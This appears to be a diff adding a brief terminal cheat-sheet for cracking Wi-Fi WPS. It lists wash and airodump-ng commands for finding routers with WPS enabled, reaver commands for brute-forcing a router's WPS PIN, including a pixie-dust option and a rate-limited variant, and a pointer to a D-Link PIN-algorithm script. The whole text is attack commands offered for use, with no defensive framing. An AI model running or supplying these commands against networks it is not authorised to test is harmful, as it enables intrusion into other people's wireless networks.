@@ -1,0 +1,16 @@
+1) to check if wps is enabled::::::::::::
+       :::in terminal:::
+          wash -i wlan0mon
+          airodump-ng --wps wlan0mon
+2) to attack:::::
+          :::in terminal:::
+              
+            reaver -b mac_addr -i wlan0 -c channel_number -vv -K1    
+
+3) for 2 attempts in 1 minute::::::::::
+          
+                   reaver -i wlan0 -c 6 -b mac_router -r 2:60      
+
+4) check and run script for::::::::
+                   
+                      wps algorithm reversed for dlink-model number      
